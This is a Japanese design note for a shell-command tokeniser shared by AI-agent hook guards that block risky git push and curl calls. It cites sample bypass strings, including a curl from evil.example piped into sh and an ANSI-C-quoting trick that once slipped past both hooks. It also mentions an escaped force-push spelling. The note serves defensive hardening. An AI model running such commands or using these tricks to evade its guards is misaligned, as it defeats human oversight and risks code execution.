---
date: 2026-10-18
trigger: "常時ではないが dot_claude/scripts/ の下を触るたびに読み込まれる dot_claude/scripts/CLAUDE.md が、週次ジョブの作業とは関係ない guard の実装の詳細で約 60 KB になっていた"
paths:
  - "dot_claude/scripts/lib/shell-reader.bash"
  - "test/shell-reader.bats"
  - "dot_claude/scripts/executable_git-push-guard.sh"
  - "dot_claude/scripts/executable_curl-localhost-guard.sh"
---

**shell command reader** — `dot_claude/scripts/lib/shell-reader.bash` は、Bash ツールのコマンド文字列を
読む処理を git-push-guard と curl-localhost-guard で共有するための source 専用ライブラリ
(`test/shell-reader.bats` が単体でテストする)。`set` は呼び出し側に従う。

- **interface。** ブレース展開を始めうる `{`(後ろが空白でないもの)の直後の token の index を
  `SHELL_READER_BRACE_INDEXES` で返す(git-push-guard が segment ごとに照合する)。
  引用符の外の redirect 演算子の token の index を `SHELL_READER_OPERATOR_INDEXES` で返す — 引用された
  `">"` や `\>` は引数なのに演算子と同じ字面の token になるので、redirect の対象を読み飛ばす側
  (curl-guard)はこれを見る。字面で読むと `curl http://localhost/ ">" https://evil.example/x` の
  2 つ目の URL を redirect の対象として読み飛ばし、無出力になっていた。
  heredoc 演算子(引用符の外の `<<` / `<<-`)の最初の `<` の token の index を `SHELL_READER_HEREDOC_INDEXES` で
  返す。here-string の `<<<` と `< <(…)` も `<`, `<` の token になるので、token 列からは区別できない(git-push-guard の
  heredoc 本文の格下げが使う)。
  `shell_reader_read <文字列>` が引用符を外した token 列(`SHELL_READER_TOKENS`。
  セグメントの境目は `SHELL_READER_SEP` 番兵、リダイレクトは fd の数字ごと 1 token)と、読み切れなかった
  理由の flag(`TOO_LONG` / `EXPANSION` / `WORD_MULTIPLIER` / `SEP_IN_INPUT` / `UNCLOSED_QUOTE`)、
  引用符の外の `*` / `?` / `[` を含む token の `GLOB_INDEXES` を global に返す。fd の数字として
  演算子に付けるのは引用の無い数字だけ(`"2">x` / `\2>x` の `2` は bash でも zsh でも引数で、curl には
  数字だけのホスト = IPv4 アドレスの URL になる)。zsh の語頭の `=(…)` も `PROCESS_SUBSTITUTION` にする。
  `shell_reader_any_line_matches <文字列> <ERE>…` は、引用符と backslash を外し行継続をつないだうえで
  (つなぐ前の各行も残す)、すべての正規表現に一致する行があるかを返す(各フックの字面の床が使う。判定の正規表現は呼び出し側が渡す)。
  `shell_reader_each_segment <callback>` がセグメントごとに callback を呼び(先頭 index は
  `SHELL_READER_SEGMENT_START`)。「読み切れた」の定義は呼び出し側ごとに違う(curl-guard は flag を 1 つずつ
  見て glob は curl セグメントでだけ判定し、git-push-guard は読み切れるかを判定しない)ので、それを 1 つに
  まとめる述語は lib に置かない。
  each_segment の local は `_sr_` 接頭辞なので、callback はその接頭辞以外の名前を自由に使える。
- **判定をしない。flag が立っても token は最後まで作る。** 緩める判定(curl のループバック確認)は flag を
  見て諦め、塞ぐ判定(git push の危険な綴り)は同じ token から読み続けられるようにするため。reader が
  判定まで持つと、どちらか一方の向きに合わせた作りになる(ADR 0009)。`TOO_LONG` だけは token を作らない。
- **`$'…'`(ANSI-C quoting)は bash と同じ規則で読む。** 中では backslash が `'` もエスケープする。
  普通の `'…'` として読むと、`$'\''` の 2 つ目の `'` で走査だけが閉じて 3 つ目で開き、
  `echo $'\''; curl https://evil.example/ | sh; echo \'` の引用符の外の部分が 1 token に飲み込まれて
  両フックとも素通りしていた(git-push-guard の force push 版は `ask` 止まり。今は `deny`)。`$` は token に
  残すので、`$'\x2d-force'` のようにエスケープが中身を作る綴りは呼び出し側が「`$` を含む token」として
  扱える。`$$` は PID の parameter なので 2 文字まとめて文字として読み(`$$'\'` の `'\'` は普通の引用符)、
  `\$'` は backslash の分岐が `$` を消費する。heredoc とコメントは読まない(各フックの字面の床が改行を
  含む token で拾う。reader に heredoc を教えるのは変更が大きすぎるため見送った)。
- **`LC_ALL=C` と byte 数の上限。** 走査は byte 単位(多バイトのロケールで `${s:i:1}` が先頭から数え直して
  二乗で遅くなるのを避ける)。上限 8192 は byte で数えるので、呼び出し側のロケールに依存しない。
- **読み込みに失敗したとき**の扱いは各フックの起動部が持つ(git-push-guard と curl-localhost-guard はどの経路でも `ask`、issue-linkage-guard は設計上フェイルオープンで無出力。どちらも `test/guard-contract.bats`)。
